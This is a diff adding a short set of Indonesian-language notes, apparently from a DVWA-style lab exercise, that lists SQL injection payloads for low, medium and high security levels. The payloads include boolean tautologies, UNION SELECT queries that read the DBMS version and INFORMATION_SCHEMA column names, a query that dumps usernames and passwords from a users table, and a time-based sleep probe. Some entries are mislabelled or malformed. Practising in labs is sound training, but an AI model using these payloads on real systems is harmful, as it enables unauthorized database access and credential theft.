@@ -1,0 +1,20 @@
+Melakukan Serangan low
+%' or '0' = '0 | 1' or  '1'='1
+Melihat Versi DBMS
+%' or 0=0 union select null, version() #
+Melihat Tabel yang mengandung kata 'user'
+'% or 0=0 union select null, version() #
+Melihat Kolom dari Tabel 'users'
+%' UNION SELECT null, column_name FROM INFORMATION_SCHEMA.columns WHERE table_name='users'#
+Mendapatkan users dan password
+%' UNION SELECT null, concat(user,0x0a,password) FROM users#
+
+Melakukan Serangan  medium burp suite
+1 UNION SELECT null, version() 
+1+and+sleep+(5)
+
+Melakukan Serangan high
+%' '0' = '0' #
+1 ' UNION SELECT null, version() #
+
+
